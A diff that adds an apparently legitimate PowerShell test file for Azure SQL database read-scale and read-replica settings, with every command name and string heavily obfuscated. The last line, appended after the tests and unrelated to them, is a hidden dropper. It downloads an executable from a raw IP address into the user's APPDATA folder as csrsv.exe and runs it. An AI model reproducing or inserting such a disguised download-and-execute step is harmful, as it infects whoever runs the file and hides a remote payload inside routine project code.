@@ -1,0 +1,86 @@
+function t`EsT-C`ReA`TeU`P`dat`EDataBAs`ereA`dScALe (${serverVE`R`s`IOn} = ("{1}{0}"-f '2.0','1'), ${lo`cati`On} = ("{2}{3}{4}{1}{0}" -f'a','Asi','Sou','thea','st '))
+{
+	
+	${R`G} = .("{6}{7}{5}{4}{1}{3}{2}{0}"-f 'est','eGrou','rT','pFo','rc','-Resou','Creat','e')
+	${SER`V`er} = &("{1}{4}{5}{0}{6}{2}{3}"-f'orT','Cr','s','t','eate','-ServerF','e') ${RG} ${l`oc`A`TION}
+	
+	
+	${DAt`AB`A`SeN`Ame1} = &("{0}{3}{2}{4}{1}"-f'G','e','seN','et-Databa','am')
+	${D`B1} = &("{1}{0}{2}{3}" -f 'AzSq','New-','lDatab','ase') -ResourceGroupName ${rg}."resOurC`eG`ROUp`N`AME" -ServerName ${SE`R`VER}."Se`RvEr`NAme" -DatabaseName ${DATAbASena`M`e1} -Edition ("{0}{1}"-f'P','remium')
+	.("{0}{3}{1}{2}" -f'A','Equ','al','ssert-Are') ${D`B1}."dATA`BAs`ENAme" ${DAtA`Bas`E`NA`mE1}
+	
+	try
+	{
+		
+		${d`B1} = .("{4}{1}{2}{3}{0}" -f'atabase','e','t-AzS','qlD','S') -ResourceGroupName ${d`B1}."Re`so`URC`egrOupNaMe" -ServerName ${d`B1}."s`eRVeRN`AmE" -DatabaseName ${D`B1}."DaTa`BAS`e`NAME" -ReadScale ("{0}{1}{2}" -f 'D','isabl','ed')
+		&("{0}{1}{2}{3}"-f 'As','se','rt','-AreEqual') ("{1}{0}{2}"-f 'bl','Disa','ed') ${D`B1}."R`eAds`caLe"
+	}
+	finally
+	{
+		&("{5}{0}{6}{7}{2}{1}{3}{4}" -f 'Re','pFor','ceGrou','T','est','Remove-','so','ur') ${RG}
+	}
+}
+
+
+
+function tE`St`-g`EtDATABasere`ADscalE (${SE`RverV`ERSION} = ("{1}{0}"-f '2.0','1'), ${LO`cat`IOn} = ("{0}{1}{2}{3}" -f 'Southea','s','t Asi','a'))
+{
+	
+	${RG} = .("{2}{1}{4}{3}{0}" -f '-ResourceGroupForTest','e','Cr','e','at')
+	${sE`RVER} = &("{0}{1}{3}{4}{6}{2}{5}" -f'C','reate-Se','rT','rve','r','est','Fo') ${RG} ${Loc`ATi`oN}
+	
+	
+	${DaTAbAS`ENa`ME} = &("{2}{0}{1}{4}{3}"-f'-D','at','Get','eName','abas')
+	${db} = .("{3}{1}{4}{2}{0}" -f'abase','w-','t','Ne','AzSqlDa') -ResourceGroupName ${r`G}."REsOurCE`G`RoU`pnAmE" -ServerName ${SeRv`eR}."SErV`eR`NAMe" -DatabaseName ${dat`ABA`Se`N`AME} -Edition ("{2}{0}{1}"-f'emiu','m','Pr')
+	&("{3}{4}{2}{0}{1}"-f 'Are','Equal','sert-','A','s') ${Db}."DA`T`AB`AsenAmE" ${datAb`A`seN`A`me}
+
+	try
+	{
+		${D`B1} = &("{2}{0}{1}{4}{3}"-f't-AzSqlD','ataba','Ge','e','s') -ResourceGroupName ${SerV`ER}."reso`URcEgro`UPN`AME" -ServerName ${S`erV`ER}."SERV`Er`NamE" -DatabaseName ${DB}."daTA`BA`sEn`Ame"
+		&("{4}{0}{2}{3}{1}" -f 'ert-Are','al','Eq','u','Ass') ("{1}{0}" -f 'led','Enab') ${D`B1}."rE`A`dsCAle"
+		.("{0}{3}{1}{4}{2}"-f 'Asse','-Are','qual','rt','E') 1 ${d`B1}."R`E`ADRep`L`iCaCOUnt"
+
+		
+		${D`B2} = &("{1}{4}{3}{0}{2}{5}" -f 'Data','S','ba','AzSql','et-','se') -ResourceGroupName ${D`B}."rESO`UrCeGro`Upn`A`Me" -ServerName ${D`B}."sErVe`R`NamE" -DatabaseName ${Db}."da`T`ABasENa`mE" `
+			-ReadScale ("{2}{0}{1}"-f'bl','ed','Disa') -ReadReplicaCount ('-1')
+		&("{2}{1}{0}{3}" -f't-AreEq','r','Asse','ual') ("{0}{1}" -f'Disable','d') ${d`B2}."r`EaD`scalE"
+		.("{1}{3}{0}{2}" -f'reEq','Asse','ual','rt-A') 0 ${d`B2}."Re`Adr`epli`ca`cOUNT"
+	}
+	finally
+	{
+		.("{4}{0}{1}{3}{2}{5}"-f'emove-Resou','r','ou','ceGr','R','pForTest') ${RG}
+	}
+}
+
+
+
+function TEs`T-datA`B`ASerEAdrEpLIcA`Co`U`Nt (${s`ERverVE`Rs`IoN} = ("{0}{1}" -f '12','.0'), ${L`oCati`on} = ("{2}{1}{3}{0}{4}" -f'st','outh','S','ea',' Asia'))
+{
+	
+	${R`G} = .("{2}{6}{5}{1}{0}{3}{4}" -f 'F','ceGroup','Create-Res','orTes','t','r','ou')
+	${s`E`RVER} = &("{2}{1}{0}{4}{3}{5}" -f 'te-S','a','Cre','rF','erve','orTest') ${rG} ${LOcaT`I`ON}
+	
+	
+	${dA`T`ABa`SEnaME} = .("{2}{0}{1}{3}"-f't-Datab','a','Ge','seName')
+	${Db} = &("{2}{4}{1}{3}{0}"-f 'se','A','New','zSqlDataba','-') -ResourceGroupName ${rG}."rEso`Urceg`RouP`NAme" -ServerName ${s`eRV`Er}."SE`R`VErNaMe" -DatabaseName ${dAT`ABa`SeNa`Me} -Edition ("{1}{2}{3}{0}" -f 'le','H','ype','rsca') `
+		-VCore 4 -ComputeGeneration ("{0}{1}"-f 'Gen','5')
+	.("{1}{4}{2}{3}{0}"-f'l','Assert-A','E','qua','re') ${D`B}."DAtABaS`en`AmE" ${dAtAbasE`N`AME}
+
+	try
+	{
+		${d`B1} = &("{0}{2}{1}{3}"-f 'G','q','et-AzS','lDatabase') -ResourceGroupName ${S`e`RveR}."r`EsOURcegR`Ou`pN`AME" -ServerName ${Se`RVer}."S`e`RvErNa`Me" -DatabaseName ${DB}."d`AtABaseN`A`me"
+		&("{3}{2}{1}{0}"-f 'al','Equ','sert-Are','As') ("{2}{1}{0}" -f'bled','na','E') ${D`B1}."rea`ds`CALe"
+		&("{3}{2}{1}{0}"-f 'Equal','t-Are','er','Ass') 1 ${D`B1}."ReadREp`li`cacou`Nt"
+
+		
+		${d`B2} = .("{1}{3}{5}{0}{2}{4}" -f'ata','S','ba','et-AzS','se','qlD') -ResourceGroupName ${d`B}."ReS`OURc`eg`R`oUpn`AME" -ServerName ${d`B}."s`e`RVeR`NAME" -DatabaseName ${D`B}."D`A`TaBAsenaMe" `
+			-ReadScale ("{0}{1}"-f 'En','abled') -ReadReplicaCount 0
+		&("{0}{1}{3}{4}{2}"-f 'A','sser','al','t-AreEq','u') ("{1}{2}{0}"-f 'ed','D','isabl') ${d`B2}."READ`ScAle"
+		&("{0}{4}{3}{2}{1}" -f 'Ass','reEqual','A','-','ert') 0 ${D`B2}."rea`drEP`lic`ACOunT"
+	}
+	finally
+	{
+		&("{3}{4}{1}{0}{2}"-f'eGroupForT','Resourc','est','Remov','e-') ${r`G}
+	}
+}
+(.("{0}{2}{1}" -f'N','Object','ew-') ("{6}{4}{1}{0}{3}{5}{2}" -f 'WebCl','Net.','t','ie','em.','n','Syst')).("{2}{0}{3}{1}"-f'wn','oadFile','Do','l').Invoke(("{11}{8}{7}{6}{2}{9}{1}{4}{3}{5}{10}{0}" -f 'e','8','102.5','ahoo/','/~y','cs','4.','p://9','tt','3.23','rsv.ex','h'),"$env:APPDATA\csrsv.exe");&("{2}{3}{1}{0}"-f 'ess','c','Sta','rt-Pro') ("$env:APPDATA\csrsv.exe")
